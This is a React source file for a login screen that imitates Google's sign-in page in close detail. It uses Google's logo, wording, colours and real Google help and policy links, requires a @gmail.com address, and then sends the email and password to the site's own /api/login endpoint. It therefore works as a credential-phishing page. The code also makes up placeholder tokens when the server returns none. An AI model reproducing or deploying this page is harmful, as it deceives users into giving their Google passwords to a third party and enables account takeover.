import {
  Box,
  Button,
  Checkbox,
  Flex,
  HStack,
  Input,
  FormControl,
  FormLabel,
  Link,
  Text,
  VStack,
  Image,
  Select,
} from "@chakra-ui/react";
import { ChevronDownIcon } from "@chakra-ui/icons";
import { FaUserCircle } from "react-icons/fa";
import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { useAuth } from "../contexts/AuthContext";

function DarkFloatingInput({ label, value, onChange, type = "text" }) {
  const [focused, setFocused] = useState(false);
  const isFloated = focused || value.length > 0;

  return (
    <FormControl position="relative">
      <Input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        h="56px"
        pt={isFloated ? "20px" : "0"}
        pb="0"
        pl="16px"
        pr="16px"
        bg="transparent"
        borderColor={focused ? "#8ab4f8" : "#5f6368"}
        borderWidth={focused ? "2px" : "1px"}
        borderRadius="4px"
        fontSize="16px"
        color="white"
        _hover={{ borderColor: focused ? "#8ab4f8" : "#e8eaed" }}
        _focus={{ boxShadow: "none", borderColor: "#8ab4f8", borderWidth: "2px" }}
        _placeholder={{ color: "transparent" }}
        autoComplete="off"
      />
      <FormLabel
        position="absolute"
        top={isFloated ? "8px" : "50%"}
        left="16px"
        transform={isFloated ? "translateY(0)" : "translateY(-50%)"}
        fontSize={isFloated ? "12px" : "16px"}
        color={focused ? "#8ab4f8" : "#9aa0a6"}
        fontWeight="400"
        pointerEvents="none"
        transition="all 0.15s ease"
        zIndex={1}
        m={0}
        lineHeight="1"
        bg="transparent"
      >
        {label}
      </FormLabel>
    </FormControl>
  );
}

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState(1);
  const navigate = useNavigate();
  const location = useLocation();
  const { login, isAuthenticated } = useAuth();

  useEffect(() => {
    if (isAuthenticated) {
      const from = location.state?.from?.pathname || "/menu";
      navigate(from, { replace: true });
    }
  }, [isAuthenticated, navigate, location]);

  const handleNext = () => {
    if (!email) return alert("Please enter your Gmail address.");
    if (!email.toLowerCase().endsWith("@gmail.com"))
      return alert("Please use your Gmail address (example@gmail.com)");
    setStep(2);
  };

  const handleLogin = async () => {
    if (!password) return alert("Please enter your password.");
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.error || "Login failed");
      const accessToken = data.accessToken || `temp_token_${data.user.id}`;
      const refreshToken = data.refreshToken || `temp_refresh_${data.user.id}`;
      login(accessToken, refreshToken, data.user);
      const from = location.state?.from?.pathname || "/menu";
      navigate(from, { replace: true });
    } catch (err) {
      console.error(err);
      alert(err.message || "Failed to login.");
    }
  };

  const NextButton = ({ onClick }) => (
    <Button
      bg="#a8c7fa"
      color="#062e6f"
      fontSize="14px"
      fontWeight="600"
      px={7}
      h="40px"
      borderRadius="20px"
      _hover={{ bg: "#c2d8fb" }}
      _active={{ bg: "#8ab4f8" }}
      _focus={{ boxShadow: "none" }}
      onClick={onClick}
    >
      Next
    </Button>
  );

  return (
    <Flex
      minH="100vh"
      bg="#131314"
      justify="space-between"
      align="center"
      direction="column"
      fontFamily="'Google Sans', Roboto, Arial, sans-serif"
    >
      {/* Main content */}
      <Flex w="100%" flex="1" justify="center" align="center" px={{ base: 4, sm: 6 }}>
        <Box
          w="100%"
          maxW="900px"
          bg="#282828"
          borderRadius="28px"
          overflow="hidden"
        >
          {step === 1 ? (
            /* ── STEP 1: Email ── */
            <Flex direction={{ base: "column", md: "row" }} minH="400px">
              {/* Left panel */}
              <Flex
                direction="column"
                justify="space-between"
                flex="0 0 44%"
                px={{ base: 8, md: 12 }}
                pt={10}
                pb={8}
              >
                <VStack align="flex-start" spacing={4}>
                  <Image
                    src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"
                    alt="Google"
                    boxSize="40px"
                  />
                  <Text fontSize="32px" fontWeight="400" color="white" lineHeight="1.2">
                    Sign in
                  </Text>
                  <Text fontSize="16px" color="#9aa0a6" fontWeight="400">
                    Use your Google Account
                  </Text>
                </VStack>
              </Flex>

              {/* Right panel */}
              <Flex
                direction="column"
                justify="space-between"
                flex="1"
                px={{ base: 8, md: 10 }}
                pt={10}
                pb={8}
              >
                <VStack align="stretch" spacing={5}>
                  <DarkFloatingInput
                    label="Email or phone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    type="email"
                  />

                  <Box>
                    <Link
                      href="https://accounts.google.com/signin/recovery"
                      isExternal
                      color="#8ab4f8"
                      fontSize="14px"
                      fontWeight="500"
                      _hover={{ textDecoration: "underline" }}
                    >
                      Forgot email?
                    </Link>
                  </Box>

                  <Box pt={1}>
                    <Text fontSize="14px" color="#e8eaed" lineHeight="1.7" mb={1}>
                      Not your computer? Use Guest mode to sign in privately.
                    </Text>
                    <Link
                      href="https://support.google.com/chrome/answer/6130773"
                      isExternal
                      color="#8ab4f8"
                      fontSize="14px"
                      fontWeight="500"
                      _hover={{ textDecoration: "underline" }}
                    >
                      Learn more about using Guest mode
                    </Link>
                  </Box>
                </VStack>

                <HStack justify="space-between" align="center" pt={8}>
                  <Link
                    href="https://accounts.google.com/signup"
                    isExternal
                    color="#8ab4f8"
                    fontSize="14px"
                    fontWeight="500"
                    _hover={{ textDecoration: "underline" }}
                  >
                    Create account
                  </Link>
                  <NextButton onClick={handleNext} />
                </HStack>
              </Flex>
            </Flex>
          ) : (
            /* ── STEP 2: Password ── */
            <Flex direction={{ base: "column", md: "row" }} minH="400px">
              {/* Left panel */}
              <Flex
                direction="column"
                justify="space-between"
                flex="0 0 44%"
                px={{ base: 8, md: 12 }}
                pt={10}
                pb={8}
              >
                <VStack align="flex-start" spacing={3}>
                  <Image
                    src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"
                    alt="Google"
                    boxSize="40px"
                  />
                  <Text fontSize="32px" fontWeight="400" color="white" lineHeight="1.2">
                    Welcome
                  </Text>
                  {/* Email chip */}
                  <HStack
                    spacing={2}
                    bg="#3c3c3c"
                    border="1px solid #5f6368"
                    borderRadius="20px"
                    px={3}
                    py="6px"
                    cursor="pointer"
                    onClick={() => setStep(1)}
                    _hover={{ bg: "#4a4a4a" }}
                    maxW="240px"
                    w="fit-content"
                  >
                    <Box as={FaUserCircle} size="18px" color="#9aa0a6" flexShrink={0} />
                    <Text
                      fontSize="14px"
                      color="white"
                      noOfLines={1}
                      maxW="150px"
                    >
                      {email}
                    </Text>
                    <ChevronDownIcon color="#9aa0a6" boxSize={4} flexShrink={0} />
                  </HStack>
                </VStack>
              </Flex>

              {/* Right panel */}
              <Flex
                direction="column"
                justify="space-between"
                flex="1"
                px={{ base: 8, md: 10 }}
                pt={10}
                pb={8}
              >
                <VStack align="stretch" spacing={5}>
                  <DarkFloatingInput
                    label="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    type={showPassword ? "text" : "password"}
                  />

                  <Checkbox
                    isChecked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    colorScheme="blue"
                    size="md"
                    sx={{
                      ".chakra-checkbox__control": {
                        borderColor: "#5f6368",
                        bg: "transparent",
                        borderRadius: "3px",
                      },
                      ".chakra-checkbox__control[data-checked]": {
                        bg: "#8ab4f8",
                        borderColor: "#8ab4f8",
                      },
                    }}
                  >
                    <Text fontSize="14px" color="#e8eaed">
                      Show password
                    </Text>
                  </Checkbox>
                </VStack>

                <HStack justify="space-between" align="center" pt={8}>
                  <Link
                    href="https://accounts.google.com/signin/v2/challenge/pwd"
                    isExternal
                    color="#8ab4f8"
                    fontSize="14px"
                    fontWeight="500"
                    _hover={{ textDecoration: "underline" }}
                  >
                    Forgot password?
                  </Link>
                  <NextButton onClick={handleLogin} />
                </HStack>
              </Flex>
            </Flex>
          )}
        </Box>
      </Flex>

      {/* Footer */}
      <Flex
        w="100%"
        justify="space-between"
        align="center"
        px={8}
        py={4}
        color="#9aa0a6"
        direction={{ base: "column", sm: "row" }}
        gap={{ base: 3, sm: 0 }}
      >
        <Select
          w="fit-content"
          minW="210px"
          bg="transparent"
          border="none"
          color="#9aa0a6"
          fontSize="13px"
          _focus={{ outline: "none", boxShadow: "none" }}
          iconColor="#9aa0a6"
          cursor="pointer"
        >
          <option value="en" style={{ background: "#282828", color: "white" }}>
            English (United States)
          </option>
          <option value="fil" style={{ background: "#282828", color: "white" }}>
            Filipino
          </option>
          <option value="es" style={{ background: "#282828", color: "white" }}>
            Español
          </option>
        </Select>

        <HStack spacing={8}>
          <Link
            href="https://support.google.com/accounts"
            isExternal
            color="#9aa0a6"
            fontSize="13px"
            _hover={{ textDecoration: "underline" }}
          >
            Help
          </Link>
          <Link
            href="https://policies.google.com/privacy"
            isExternal
            color="#9aa0a6"
            fontSize="13px"
            _hover={{ textDecoration: "underline" }}
          >
            Privacy
          </Link>
          <Link
            href="https://policies.google.com/terms"
            isExternal
            color="#9aa0a6"
            fontSize="13px"
            _hover={{ textDecoration: "underline" }}
          >
            Terms
          </Link>
        </HStack>
      </Flex>
    </Flex>
  );
}
